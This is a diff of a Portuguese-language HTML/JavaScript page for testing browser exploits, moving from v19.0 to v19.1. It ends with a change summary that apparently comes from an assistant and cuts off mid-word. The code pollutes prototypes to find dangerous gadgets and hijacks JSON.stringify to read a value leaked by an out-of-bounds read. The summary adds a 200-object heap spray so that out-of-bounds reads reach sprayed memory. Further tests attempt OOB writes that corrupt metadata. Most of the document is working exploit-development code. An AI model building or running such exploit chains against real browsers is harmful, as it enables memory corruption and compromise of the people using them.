-                        log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME);
-                    }
-                }
-                await PAUSE(15); // Pequena pausa entre poluições
-            }
+            for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue); } catch(e){} if (gadgetMsg) { log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++; if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); }
             log(`--- Teste 3 Concluído (${successCount} OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME);
             if (gadgetCount > 0) { log(`Gadgets detectados: ${gadgetMessages.join('; ')}`, 'critical', FNAME); }
             await PAUSE();
         };
 
-        // 4. Teste de Interação (Hijack + OOB - Baseado no Script 1 v18.1.1)
+        // 4. Teste de Interação (Hijack + OOB - Inalterado v19.0)
         const testPPJsonHijackInteraction = async () => {
             const FNAME = 'testPPJsonHijackInteraction';
             log("--- Teste 4: PP Hijack (JSON.stringify) + OOB Interaction ---", 'test', FNAME);
-            const orig = JSON.stringify; // Salvar original
-            let okH = false; let okL = false; let okR = false;
-
-            try {
-                // Tentar sequestrar JSON.stringify
-                JSON.stringify = function hijacked(v, r, s) {
-                    log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME);
-                    okH = true;
-                    try {
-                        const l = leakedValueFromOOB; // Tentar ler o valor vazado no Teste 1
-                        let lStr = "NULO ou Indefinido";
-                        let lHex = "";
-                        if (l) {
-                            lHex = ` (H=${toHex(l.high)}, L=${toHex(l.low)})`; // Log Hex
-                            lStr = l.type === 'U64'
-                                ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}`
-                                : `U32 ${toHex(l.low)} @${l.offset}`;
-                            okL = true; // Marcar que a leitura do leak funcionou
-                            log(` ---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME);
-                        }
-                        log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME);
-                    } catch(ie) {
-                        log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME);
-                        console.error(ie);
-                    }
-                    // Retornar valor modificado para confirmar o hijack
-                    const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}';
-                    return hijackReturnValue;
-                };
-
-                await PAUSE();
-                const testObject = {a:1, b: 'test'};
-                const result = JSON.stringify(testObject); // Chamar a versão (potencialmente) sequestrada
-
-                // Verificar se o hijack funcionou e o retorno foi o esperado
-                if (result && result.includes('"hijacked": true')) {
-                    log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME);
-                    okR = true;
-                } else if (okH) {
-                    log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME);
-                } else {
-                    log("JSON.stringify não foi sequestrado.", 'good', FNAME);
-                }
-            } catch (e) {
-                log(`Erro fatal durante Teste 4: ${e.message}`, 'error', FNAME);
-                console.error(e);
-            } finally {
-                // Restaurar JSON.stringify original SEMPRE
-                const currentStringify = JSON.stringify;
-                JSON.stringify = orig;
-                if (currentStringify !== orig && JSON.stringify !== orig) {
-                    log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME);
-                } else if (okH) { // Só logar restauração se houve hijack
-                    log("JSON.stringify restaurado.", 'good', 'Cleanup');
-                }
-            }
+            const orig = JSON.stringify; let okH = false; let okL = false; let okR = false;
+            try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; let lHex = ""; if (l) { lHex = ` (H=${toHex(l.high)}, L=${toHex(l.low)})`; lStr = l.type === 'U64' ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : `U32 ${toHex(l.low)} @${l.offset}`; okL = true; log(` ---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME); } log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste 4: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} }
             log(`--- Teste 4 Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME);
-            return okR && okL; // Retorna true se hijack e leitura do leak funcionaram
+            return okR && okL;
         };
 
-
-        // --- Função Principal de Execução ---
+        // --- Função Principal de Execução (v19.1) ---
         const runExploitFocusedTests = async () => {
             const FNAME = 'runExploitFocusedTests';
-            if (runBtn) runBtn.disabled = true; // Desabilitar botão
-            findings = []; // Limpar findings anteriores
+            if (runBtn) runBtn.disabled = true; findings = [];
             const summaryDiv = document.getElementById('summary');
-            if (summaryDiv) summaryDiv.innerHTML = ''; // Limpar sumário anterior
-            if (outputDiv) outputDiv.innerHTML = ''; // Limpar log anterior
-
-            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.0) ====", 'test', FNAME);
-
-            // Executar testes em sequência
-            await testOOBReadInfoLeak(); // Tenta vazar info primeiro
+            if (summaryDiv) summaryDiv.innerHTML = ''; if (outputDiv) outputDiv.innerHTML = '';
+            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.1) ====", 'test', FNAME);
+            await testOOBReadInfoLeak(); // v19.1 com spray
             await PAUSE(MEDIUM_PAUSE);
-
-            await testOOBWriteMetadata(); // Tenta corromper metadata
+            await testOOBWriteMetadata();
             await PAUSE(MEDIUM_PAUSE);
-
-            await testAdvancedPP(); // Testa PP avançada e gadgets
+            await testAdvancedPP();
             await PAUSE(MEDIUM_PAUSE);
-
-            await testPPJsonHijackInteraction(); // Tenta interação Hijack + Leak OOB
+            await testPPJsonHijackInteraction();
             await PAUSE(MEDIUM_PAUSE);
-
-            // Gerar Sumário Final
             log("\n==== GERANDO SUMÁRIO FINAL ====", 'test', FNAME);
             if (summaryDiv) {
                 summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2>';
-                if (findings.length === 0) {
-                    summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>';
-                } else {
-                    summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`;
-                    // Ordenar findings por tipo para melhor visualização (opcional)
-                    findings.sort((a, b) => {
-                        const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 };
-                        return (order[a.type] || 99) - (order[b.type] || 99);
-                    });
-                    findings.forEach(f => {
-                        const itemClass = f.type === 'critical' ? 'log-critical' :
-                                        f.type === 'escalation' ? 'log-escalation' :
-                                        f.type === 'ptr' ? 'log-ptr' :
-                                        f.type === 'leak' ? 'log-leak' : 'log-vuln'; // Default to vuln
-                        const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                        summaryDiv.innerHTML += `<li class="${itemClass}">${f.time} [${f.funcName}] ${cleanMessage}</li>`;
-                    });
-                    summaryDiv.innerHTML += '</ul>';
-                }
+                if (findings.length === 0) { summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>'; } else { summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`; findings.sort((a, b) => { const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 }; return (order[a.type] || 99) - (order[b.type] || 99); }); findings.forEach(f => { const itemClass = f.type === 'critical' ? 'log-critical' : f.type === 'escalation' ? 'log-escalation' : f.type === 'ptr' ? 'log-ptr' : f.type === 'leak' ? 'log-leak' : 'log-vuln'; const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;"); summaryDiv.innerHTML += `<li class="${itemClass}">${f.time} [${f.funcName}] ${cleanMessage}</li>`; }); summaryDiv.innerHTML += '</ul>'; }
             }
-
-            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.0) ====", 'test', FNAME);
-            if (runBtn) runBtn.disabled = false; // Reabilitar botão
+            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.1) ====", 'test', FNAME);
+            if (runBtn) runBtn.disabled = false;
         };
-
     </script>
 
 </body>
 </html>
 ```
 
-**Resumo das Mudanças (v19.0):**
+**Resumo das Mudanças (v19.1):**
 
-1.  **HTML Simplificado:** Removida a seção do Script 2, o canvas, e os elementos de UI associados. Mantido apenas um botão, uma área de log (`#output`) e uma área de sumário (`#summary`). Títulos e descrições atualizados.
-2.  **Script Único:** Todo o JavaScript está agora em um único bloco `<script>`.
-3.  **Funções Mantidas:** Incluídas as funções `log`, `PAUSE`, `toHex`, `isPotentialPointer64`, `isPotentialData32`, e os 4 testes priorizados (`testOOBReadInfoLeak`, `testOOBWriteMetadata`, `testAdvancedPP`, `testPPJsonHijackInteraction`).
-4.  **Log e Sumário Unificados:** A função `log` agora usa `#output` e `#summary`, e um único array `findings` coleta os resultados para o sumário. Findings do tipo `ptr` e `leak` também foram adicionados ao sumário para maior visibilidade.
-5.  **Execução Sequencial:** A nova função `runExploitFocusedTests` chama os 4 testes em uma ordem lógica (Leak -> Write -> PP -> Interaction).
-6.  **Limpeza:** Removidas variáveis e funções não utilizadas dos scripts originais.
-7.  **Sumário:** Altura aumentada para `70vh` e inclui findings do tipo `ptr` e `leak`.
+1.  **`testOOBReadInfoLeak` Modificado:**
+    * Ajustados `bufferSize`, `allocationSize`, `baseOffsetInBuffer` e a faixa de leitura (`readRangeStart`, `readRangeEnd`).
+    * Adicionado um loop que cria `sprayCount` (200) objetos simples (`{marker: ..., padding: ...}`) e os armazena em `sprayedObjects` antes de alocar o buffer de controle.
+    * A lógica de leitura OOB agora também verifica se os valores lidos (U64 ou U32) correspondem aos padrões `0x41414141` ou `0x42424242`, logando como `Objeto Spray?` se encontrar.
+    * Ignora a leitura de padrões de preenchimento `0xAAAAAAAA`.
+2.  **Outros Testes:** `testOOBWriteMetadata`, `testAdvancedPP`, e `testPPJsonHijackInteraction` permanecem como na v19.0.
+3.  **Versionamento:** Atualizado para v19.1.
 
-Este script é mais direcionado e deve ser mais fácil de analisar os resultados focados nas primitivas de exploração. Teste-o e veja se ele funciona como esperado no seu ambien
+Teste esta nova versão. O objetivo é ver se a combinação do spray de objetos e os ajustes nos parâmetros de alocação/leitura resultam em um `leakedValueFromOOB` que **não** seja `0xAAAAAAAA AAAAAAAA`, ou se aparecem logs `Objeto Spray?` indicando que a leitura OOB atingiu a memória desses objetos. Boa sor
